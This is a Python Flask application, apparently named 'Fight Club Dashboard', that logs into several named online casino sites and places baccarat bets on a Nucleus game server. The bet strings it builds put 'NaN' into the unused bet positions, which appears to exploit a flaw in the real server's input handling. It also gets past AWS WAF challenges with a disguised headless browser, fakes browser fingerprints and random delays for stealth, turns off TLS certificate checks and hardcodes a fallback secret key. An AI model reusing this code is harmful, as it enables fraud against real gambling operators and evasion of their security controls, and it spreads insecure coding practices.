from flask import Flask, render_template, request, jsonify, redirect, session
import ssl, json, time, re, base64, urllib.request, urllib.error, os, uuid
from http.cookiejar import CookieJar
from urllib.parse import unquote, urlencode
import random

app = Flask(__name__)
# Fixed key so sessions survive restarts/deploys — override via env var
app.secret_key = os.environ.get('SECRET_KEY', 'fc_s3cr3t_k3y_f1ght_club_2026_x9z')
app.config['SESSION_COOKIE_NAME'] = 'fc_session'
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = 86400  # 24 hours

sslctx = ssl.create_default_context()
sslctx.check_hostname = False
sslctx.verify_mode = ssl.CERT_NONE

# Supported casino sites — all use same Nucleus backend
SITES = {
    "starexch555.com": {
        "name": "StarExch555",
        "base": "https://starexch555.com",
        "launch": "https://starexch555.com/softswiss/launch?q=2409&type=slots",
    },
    "playinhorse.com": {
        "name": "PlayInHorse",
        "base": "https://playinhorse.com",
        "launch": "https://playinhorse.com/softswiss/launch?q=2409&type=slots",
    },
    "cricash24.com": {
        "name": "Cricash24",
        "base": "https://cricash24.com",
        "launch": "https://cricash24.com/softswiss/launch?q=2409&type=slots",
    },

    "khelo24match99.com": {
        "name": "Khelo24Match99",
        "base": "https://khelo24match99.com",
        "launch": "https://khelo24match99.com/softswiss/launch?q=2409&type=slots",
    },
    "betinexchange88.com": {
        "name": "BetInExchange88",
        "base": "https://betinexchange88.com",
        "launch": "https://betinexchange88.com/softswiss/launch?q=2409&type=slots",
    },
    "spinmatch99.com": {
        "name": "SpinMatch99",
        "base": "https://spinmatch99.com",
        "launch": "https://spinmatch99.com/softswiss/launch?q=2409&type=slots",
    },
    "spinjeet365.com": {
        "name": "SpinJeet365",
        "base": "https://spinjeet365.com",
        "launch": "https://spinjeet365.com/softswiss/launch?q=2409&type=slots",
    },
}

GAME_BASE = "https://softswiss-ng.nucleusgaming.com"
GAME_SERVER = "https://games-ng.nucleusgaming.com"

sessions_state = {}


# ============================================================
# AUTO LOGIN — extracts cookies from username/password
# ============================================================

import socket

# SOCKS5 proxy config — when home_tunnel.sh is running, casino traffic goes through home IP
SOCKS_PROXY_HOST = "127.0.0.1"
SOCKS_PROXY_PORT = 1080

def is_socks_available():
    """Check if the SOCKS proxy (home tunnel) is running."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((SOCKS_PROXY_HOST, SOCKS_PROXY_PORT))
        s.close()
        return True
    except:
        return False


class SocksProxyHandler(urllib.request.BaseHandler):
    """Route urllib requests through SOCKS5 proxy for home IP routing."""
    def __init__(self, proxy_host, proxy_port):
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port

    def _socks_connect(self, host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((self.proxy_host, self.proxy_port))
        # SOCKS5 handshake — no auth
        s.send(b'\x05\x01\x00')
        resp = s.recv(2)
        if resp != b'\x05\x00':
            s.close()
            raise Exception("SOCKS5 handshake failed")
        # Connect request
        addr_bytes = host.encode()
        req = b'\x05\x01\x00\x03' + bytes([len(addr_bytes)]) + addr_bytes + port.to_bytes(2, 'big')
        s.send(req)
        resp = s.recv(10)
        if resp[1] != 0:
            s.close()
            raise Exception(f"SOCKS5 connect failed: {resp[1]}")
        return s


def auto_login(site_key, username, password):
    """Login to casino site with username/password, return session cookies."""
    site = SITES[site_key]
    base = site["base"]

    jar = CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=sslctx)
    )
    UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"

    # Modern Stealth Chrome Browser Headers
    STEALTH_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
    BROWSER_HEADERS = {
        "User-Agent": STEALTH_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-CH-UA": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i",
    }

    # Step 1: GET main page to get XSRF token + session cookies (with auto-retry)
    import time as _time
    html = ""
    for attempt in range(3):
        try:
            req = urllib.request.Request(base)
            for k, v in BROWSER_HEADERS.items():
                req.add_header(k, v)
            resp = opener.open(req, timeout=30)
            html = resp.read().decode('utf-8', 'ignore')
            break
        except urllib.error.HTTPError as he:
            if he.code == 403 and attempt < 2:
                _time.sleep(2)
                continue
            if attempt == 2:
                raise
        except Exception:
            if attempt == 2:
                raise
            _time.sleep(2)

    # Extract XSRF from cookies
    xsrf = None
    for c in jar:
        if 'XSRF' in c.name.upper():
            xsrf = unquote(c.value)

    # Extract CSRF from meta tag (for khelo/playkaro style sites)
    csrf_meta = None
    csrf_m = re.search(r'meta\s+name="csrf-token"\s+content="([^"]+)"', html)
    if csrf_m:
        csrf_meta = csrf_m.group(1)

    # Fallback: if CSRF meta not on homepage, try /mobile page (works for all Nucleus sites)
    if not csrf_meta:
        try:
            mob_req = urllib.request.Request(f"{base}/mobile")
            for k, v in BROWSER_HEADERS.items():
                mob_req.add_header(k, v)
            mob_resp = opener.open(mob_req, timeout=30)
            mob_html = mob_resp.read().decode('utf-8', 'ignore')
            mob_m = re.search(r'meta\s+name="csrf-token"\s+content="([^"]+)"', mob_html)
            if mob_m:
                csrf_meta = mob_m.group(1)
            # Also grab any new XSRF cookies from /mobile
            if not xsrf:
                for c in jar:
                    if 'XSRF' in c.name.upper():
                        xsrf = unquote(c.value)
                        break
        except:
            pass

    # Robust fallback: use csrf_meta or any session cookie if xsrf cookie not explicitly named
    if not xsrf:
        xsrf = csrf_meta
    if not xsrf and jar:
        xsrf = next((c.value for c in jar), None)

    # Check for AWS WAF 202 Challenge or missing tokens
    is_waf_challenge = "awsWafCookieDomainList" in html or "gokuProps" in html

    # AUTO-SOLVE: If AWS WAF challenge detected and no tokens, use headless browser
    if not xsrf and not csrf_meta and is_waf_challenge:
        import sys
        print(f"[WAF-SOLVER] AWS WAF challenge detected on {site_key}, launching headless solver...", file=sys.stderr)
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True, args=[
                    '--no-sandbox', '--disable-setuid-sandbox',
                    '--disable-blink-features=AutomationControlled',
                ])
                ctx = browser.new_context(
                    user_agent=STEALTH_UA,
                    viewport={"width": 1920, "height": 1080},
                )
                page = ctx.new_page()
                page.goto(base, wait_until="networkidle", timeout=30000)
                # Wait for WAF challenge to auto-solve (usually 1-3 seconds)
                page.wait_for_timeout(4000)

                # Extract all cookies from browser
                browser_cookies = ctx.cookies()
                browser.close()

            print(f"[WAF-SOLVER] Got {len(browser_cookies)} cookies from headless browser", file=sys.stderr)

            # Feed cookies into urllib jar so the rest of auto_login works
            import http.cookiejar
            for bc in browser_cookies:
                cookie = http.cookiejar.Cookie(
                    version=0, name=bc['name'], value=bc['value'],
                    port=None, port_specified=False,
                    domain=bc.get('domain', site_key), domain_specified=True, domain_initial_dot=bc.get('domain','').startswith('.'),
                    path=bc.get('path', '/'), path_specified=True,
                    secure=bc.get('secure', False), expires=None, discard=True,
                    comment=None, comment_url=None, rest={}, rfc2109=False,
                )
                jar.set_cookie(cookie)

            # Re-extract XSRF from the new cookies
            for c in jar:
                if 'XSRF' in c.name.upper():
                    xsrf = unquote(c.value)
                    break

            # Re-fetch homepage with WAF cookies now set
            req2 = urllib.request.Request(base)
            for k, v in BROWSER_HEADERS.items():
                req2.add_header(k, v)
            resp2 = opener.open(req2, timeout=30)
            html2 = resp2.read().decode('utf-8', 'ignore')
            csrf_m2 = re.search(r'meta\s+name="csrf-token"\s+content="([^"]+)"', html2)
            if csrf_m2:
                csrf_meta = csrf_m2.group(1)
            if not csrf_meta:
                # Try /mobile with WAF cookies
                mob2 = urllib.request.Request(f"{base}/mobile")
                for k, v in BROWSER_HEADERS.items():
                    mob2.add_header(k, v)
                mob_resp2 = opener.open(mob2, timeout=30)
                mob_html2 = mob_resp2.read().decode('utf-8', 'ignore')
                mob_m2 = re.search(r'meta\s+name="csrf-token"\s+content="([^"]+)"', mob_html2)
                if mob_m2:
                    csrf_meta = mob_m2.group(1)

            # Update xsrf if we found csrf_meta
            if not xsrf and csrf_meta:
                xsrf = csrf_meta
            if not xsrf:
                for c in jar:
                    if 'XSRF' in c.name.upper():
                        xsrf = unquote(c.value)
                        break

            print(f"[WAF-SOLVER] After solving: xsrf={bool(xsrf)}, csrf_meta={bool(csrf_meta)}", file=sys.stderr)

        except ImportError:
            raise Exception(f"AWS WAF Challenge on {site_key} — Playwright not installed on server. Paste cookies manually.")
        except Exception as waf_err:
            print(f"[WAF-SOLVER] Failed: {waf_err}", file=sys.stderr)
            raise Exception(f"AWS WAF Challenge on {site_key} — auto-solve failed: {waf_err}")

    if not xsrf and not csrf_meta:
        raise Exception(f"Could not connect to site security token for {site_key} — please try again in 5 seconds")

    # Common XHR headers that look like a real browser AJAX call
    def make_xhr_headers(content_type, extra=None):
        h = {
            "User-Agent": STEALTH_UA,
            "Content-Type": content_type,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Requested-With": "XMLHttpRequest",
            "X-XSRF-TOKEN": xsrf,
            "Origin": base,
            "Referer": f"{base}/",
            "Sec-CH-UA": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Priority": "u=1, i",
        }
        if extra:
            h.update(extra)
        return h

    # Step 2: Site-specific login
    if site_key == "starexch555.com":
        # starexch555: need _token from /append/loginpp
        lp_req = urllib.request.Request(f"{base}/append/loginpp",
            headers={"User-Agent": STEALTH_UA, "X-Requested-With": "XMLHttpRequest",
                     "Referer": f"{base}/", "Sec-Fetch-Dest": "empty",
                     "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"})
        lp_resp = opener.open(lp_req, timeout=20)
        lp_html = lp_resp.read().decode('utf-8', 'ignore')
        token_m = re.search(r"_token:\s*'([^']+)'", lp_html)
        csrf_token = token_m.group(1) if token_m else (csrf_meta or xsrf)

        login_data = urlencode({
            "username": username, "password": password,
            "remember_me": 1, "_token": csrf_token,
        }).encode()
        login_req = urllib.request.Request(f"{base}/login",
            data=login_data,
            headers=make_xhr_headers("application/x-www-form-urlencoded"),
            method="POST")

    elif site_key in ("spinmatch99.com", "spinjeet365.com"):
        # betexchange_session backend — standard Laravel web login
        # uses username field + _token, same pattern as StarExch555
        login_data = urlencode({
            "username": username, "password": password,
            "remember_me": 1, "_token": csrf_meta or xsrf,
        }).encode()
        login_req = urllib.request.Request(f"{base}/login",
            data=login_data,
            headers=make_xhr_headers("application/x-www-form-urlencoded",
                {"x-csrf-token": csrf_meta or xsrf}),
            method="POST")

    elif site_key in ("playinhorse.com", "betinexchange88.com"):
        login_data = json.dumps({"username": username, "password": password}).encode()
        login_req = urllib.request.Request(f"{base}/api2/v2/login",
            data=login_data,
            headers=make_xhr_headers("application/json"),
            method="POST")

    elif site_key == "cricash24.com":
        login_data = urlencode({
            "email": username, "password": password,
        }).encode()
        login_req = urllib.request.Request(f"{base}/api2/v2/login",
            data=login_data,
            headers=make_xhr_headers("application/x-www-form-urlencoded",
                {"X-CSRF-Token": csrf_meta or xsrf}),
            method="POST")

    elif site_key == "khelo24match99.com":
        login_data = urlencode({
            "_token": csrf_meta or xsrf,
            "email": username, "password": password,
        }).encode()
        login_req = urllib.request.Request(f"{base}/api2/login",
            data=login_data,
            headers=make_xhr_headers("application/x-www-form-urlencoded",
                {"X-CSRF-Token": csrf_meta or xsrf}),
            method="POST")

    else:
        raise Exception(f"No login handler for {site_key}")

    # Step 3: Execute login
    import sys
    print(f"[LOGIN DEBUG] Site: {site_key}, Endpoint: {login_req.full_url}, Method: {login_req.method}", file=sys.stderr)
    print(f"[LOGIN DEBUG] Content-Type: {login_req.get_header('Content-type')}", file=sys.stderr)
    print(f"[LOGIN DEBUG] Payload: {login_req.data[:200] if login_req.data else 'None'}", file=sys.stderr)
    try:
        resp = opener.open(login_req, timeout=30)
        body = resp.read().decode('utf-8', 'ignore')
        status = resp.status
        print(f"[LOGIN DEBUG] Response: HTTP {status} -> {body[:200]}", file=sys.stderr)
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', 'ignore')
        status = e.code
        if status == 422:
            try:
                err = json.loads(body)
                msg = err.get("message", "") or str(err.get("errors", ""))
                raise Exception(f"Invalid credentials: {msg}")
            except json.JSONDecodeError:
                raise Exception("Invalid credentials")
        elif status == 419:
            raise Exception("CSRF token mismatch — try again")
        elif status == 403:
            try:
                err = json.loads(body)
                msg = err.get("message", "") or "Rate limited"
                raise Exception(f"Site blocked request: {msg}")
            except:
                raise Exception("Too many attempts — click 'Clear All Cache & Data' and wait 30s")
        else:
            raise Exception(f"Login failed: HTTP {status}")

    # Step 4: Validate response
    try:
        resp_json = json.loads(body)
        resp_status = resp_json.get("status", 200)
        msg = resp_json.get("message", "")

        if resp_status in (201, 303, 403) or "reset your password" in msg.lower() or "invalid" in msg.lower():
            raise Exception(f"Invalid credentials: Check username & password for {site['name']}")
        elif resp_status not in (200, 304, True) and not resp_json.get("success"):
            raise Exception(f"Login failed: {msg}")
    except json.JSONDecodeError:
        pass

    # Step 5: Build cookie string
    cookie_parts = [f"{c.name}={c.value}" for c in jar]
    cookie_string = "; ".join(cookie_parts)

    if not cookie_string:
        raise Exception("No cookies received after login")

    return cookie_string


# ============================================================
# GAME SESSION HELPERS
# ============================================================

FULL_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"

def get_token(site_key, cookies):
    site = SITES[site_key]
    req = urllib.request.Request(site["launch"],
        headers={
            "User-Agent": FULL_UA,
            "Cookie": cookies,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-CH-UA": '"Chromium";v="136", "Google Chrome";v="136"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"macOS"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
        })
    resp = urllib.request.urlopen(req, context=sslctx, timeout=30)
    body = resp.read().decode('utf-8', 'ignore')
    om = re.search(r'options=([^"&\s]+)', body)
    if not om:
        raise Exception("Session expired — please re-login")
    ob = unquote(om.group(1))
    ob += '=' * (4 - len(ob) % 4) if len(ob) % 4 else ''
    o = json.loads(base64.b64decode(ob))
    gu = o["launch_options"]["game_url"]
    # Return full game_url — Nucleus requires all params (cashierUrl, homeUrl, etc.)
    return gu


def get_sid(game_url):
    """Fetch the Nucleus game session SID using the full game_url from get_token()."""
    req = urllib.request.Request(game_url, headers={
        "User-Agent": FULL_UA,
        "Accept": "text/html,application/xhtml+xml,*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
    })
    resp = urllib.request.urlopen(req, context=sslctx, timeout=30)
    html = resp.read().decode('utf-8', 'ignore')
    sid_m = re.search(r'SID=([^&"]+)', html)
    if not sid_m:
        # Log what Nucleus returned for debugging
        err_m = re.search(r'Sorry,[^<]{0,200}', html)
        detail = err_m.group(0).strip() if err_m else html[:200]
        raise Exception(f"Could not get game session: {detail}")
    return sid_m.group(1)


def place_bet(sid, bet_string):
    # Random human-like delay (0.3-1.2s) for stealth
    time.sleep(random.uniform(0.3, 1.2))
    # Randomize CREQUESTID like real game client (random 4-digit)
    params = {
        "SID": sid, "CMD": "PLACEBET", "BET": bet_string,
        "TIME": str(int(time.time() * 1000) + random.randint(-50, 50)),
        "CREQUESTID": str(random.randint(1000, 9999)),
        "AUTOPLAYSPIN": "FALSE", "TURBO_RUN": "1|-1|-1|-1|-1",
    }
    req = urllib.request.Request(f"{GAME_SERVER}/BaccaratDual.game",
        data=urlencode(params).encode(),
        headers={
            "User-Agent": FULL_UA,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": GAME_BASE,
            "Referer": f"{GAME_BASE}/",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
        }, method="POST")
    resp = urllib.request.urlopen(req, context=sslctx, timeout=20)
    raw = resp.read().decode('utf-8', 'ignore')
    result = {}
    for part in raw.split('&'):
        if '=' in part:
            k, v = part.split('=', 1)
            result[k.strip()] = v.strip()
    return result, raw


def card_name(cid):
    if cid in (-1, '-1'): return None
    try:
        c = int(cid)
        return f"{['A','2','3','4','5','6','7','8','9','10','J','Q','K'][c%13]}{'♠♥♦♣'[c//13]}"
    except:
        return str(cid)


def parse_cards(s):
    if not s: return []
    return [c for c in [card_name(p) for p in s.strip().split()] if c]


def get_session_key():
    """Return a unique key for the current user's session (site:user:uuid)."""
    return session.get('state_key', 'anonymous')

def get_state(key=None):
    if key is None:
        key = get_session_key()
    if key not in sessions_state:
        sessions_state[key] = {
            "balance": 0, "initial_balance": 0, "total_profit": 0,
            "rounds": 0, "wins": 0, "losses": 0, "history": [],
        }
    return sessions_state[key]


# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    if 'logged_in' not in session:
        return render_template('nan_login.html', sites=SITES, tunnel_active=is_socks_available())
    return render_template('nan_dashboard.html',
        site_name=session.get('site_name', ''),
        balance=session.get('balance', 0),
        username=session.get('username', ''),
    )


@app.route('/api/tunnel/status')
def tunnel_status():
    return jsonify({"active": is_socks_available()})


@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    site_key = data.get('site', '')
    username = data.get('username', '').strip()
    password = data.get('password', '').strip()
    manual_cookies = data.get('cookies', '').strip()

    if site_key not in SITES:
        return jsonify({"success": False, "message": "Unknown site"}), 400

    site = SITES[site_key]
    is_waf = site.get("waf", False)

    if is_waf:
        # WAF sites need manual cookie paste
        if not manual_cookies:
            return jsonify({"success": False, "message": "This site requires cookies — paste from browser DevTools"}), 400
        cookies = manual_cookies
        if not username:
            username = site_key.split('.')[0]
    else:
        # Normal auto-login
        if not username or not password:
            return jsonify({"success": False, "message": "Username and password required"}), 400

    try:
        if not is_waf:
            cookies = auto_login(site_key, username, password)

        # Get game token + SID
        token = get_token(site_key, cookies)
        sid = get_sid(token)

        # Get balance
        result, _ = place_bet(sid, "NaN 0 0")
        balance = float(result.get('BALANCE', 0))

        # Store in Flask session — each browser gets its own isolated session
        session.permanent = True
        state_key = f"{site_key}:{username}:{uuid.uuid4().hex[:8]}"
        session['logged_in'] = True
        session['state_key'] = state_key
        session['site'] = site_key
        session['site_name'] = site['name']
        session['cookies'] = cookies
        session['balance'] = balance
        session['username'] = username
        session['sid'] = sid  # Game session ID — unique per player

        st = get_state()
        st['balance'] = balance
        st['initial_balance'] = balance

        return jsonify({
            "success": True,
            "site": site['name'],
            "balance": balance,
            "username": username,
        })

    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 400


@app.route('/api/logout')
def logout():
    session.clear()
    return redirect('/')


@app.route('/api/clear-cache', methods=['POST'])
def clear_cache():
    """Nuclear wipe: ALL in-memory state, session cookies, everything."""
    global sessions_state
    sessions_state = {}  # Wipe ALL users' game state
    session.clear()      # Wipe Flask session cookie
    return jsonify({"success": True, "message": "All cache, sessions and data wiped completely"})


@app.route('/api/bet', methods=['POST'])
def bet():
    if 'logged_in' not in session:
        return jsonify({"error": "Not logged in"}), 401

    data = request.json
    amount = data.get('amount', 1)
    position = data.get('position', 'banker')

    try:
        amount = float(amount)
    except:
        return jsonify({"error": "Invalid amount"}), 400
    if amount <= 0:
        return jsonify({"error": "Amount must be > 0"}), 400

    bet_map = {
        'player': f"{amount} NaN 0",
        'banker': f"NaN {amount} 0",
        'tie':    f"NaN 0 {amount}",
    }
    if position not in bet_map:
        return jsonify({"error": "Invalid position"}), 400

    try:
        # Reuse stored SID — don't create new session on every bet
        sid = session.get('sid')

        if not sid:
            token = get_token(session['site'], session['cookies'])
            sid = get_sid(token)
            session['sid'] = sid

        result, raw = place_bet(sid, bet_map[position])

        # If bet failed, try refreshing SID (and re-login if cookies expired)
        if result.get('RESULT') != 'OK':
            error_text = unquote(result.get('ERRORTEXT', '')).lower()
            if 'session' in error_text or 'expired' in error_text or 'invalid' in error_text:
                try:
                    # Try getting new SID with existing cookies
                    token = get_token(session['site'], session['cookies'])
                    sid = get_sid(token)
                except:
                    # Cookies dead — clear SID, user must re-login
                    session.pop('sid', None)
                    return jsonify({"error": "Session expired — please re-login"}), 401

                session['sid'] = sid
                result, raw = place_bet(sid, bet_map[position])

        if result.get('RESULT') != 'OK':
            return jsonify({"error": f"{result.get('RESULT')}: {unquote(result.get('ERRORTEXT', '?'))}"}), 400

        balance = float(result.get('BALANCE', 0))
        winner_code = result.get('WINNER', '?')
        winner = {'0': 'TIE', '1': 'PLAYER', '2': 'BANKER'}.get(winner_code, winner_code)
        payout = result.get('PAYOUT', '0')

        won = (position == 'player' and winner_code == '1') or \
              (position == 'banker' and winner_code == '2') or \
              (position == 'tie' and winner_code == '0')

        old_bal = session.get('balance', 0)
        profit = round(balance - old_bal, 2)
        session['balance'] = balance

        st = get_state()
        st['balance'] = balance
        st['rounds'] += 1
        st['total_profit'] = round(balance - st['initial_balance'], 2)
        if won: st['wins'] += 1
        else: st['losses'] += 1

        rd = {
            "round": st['rounds'], "amount": amount, "position": position.upper(),
            "winner": winner, "payout": payout, "profit": profit,
            "balance": balance, "won": won, "time": time.strftime("%H:%M:%S"),
            "player_cards": parse_cards(result.get('PLAYERPOKER', '')),
            "dealer_cards": parse_cards(result.get('DEALERPOKER', '')),
        }
        st['history'].insert(0, rd)
        st['history'] = st['history'][:100]

        return jsonify({
            "success": True, **rd,
            "total_profit": st['total_profit'],
            "wins": st['wins'], "losses": st['losses'],
            "win_rate": round(st['wins'] / st['rounds'] * 100, 1) if st['rounds'] else 0,
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/balance')
def get_balance():
    if 'logged_in' not in session:
        return jsonify({"error": "Not logged in"}), 401
    try:
        sid = session.get('sid')
        if not sid:
            token = get_token(session['site'], session['cookies'])
            sid = get_sid(token)
            session['sid'] = sid
        result, _ = place_bet(sid, "NaN 0 0")
        balance = float(result.get('BALANCE', 0))
        session['balance'] = balance
        st = get_state()
        st['balance'] = balance
        return jsonify({"balance": balance, "total_profit": round(balance - st['initial_balance'], 2)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    print("\n" + "=" * 50)
    print("  🥊 Fight Club Dashboard")
    print("  http://localhost:5000")
    print("=" * 50 + "\n")
    app.run(debug=True, port=5000)
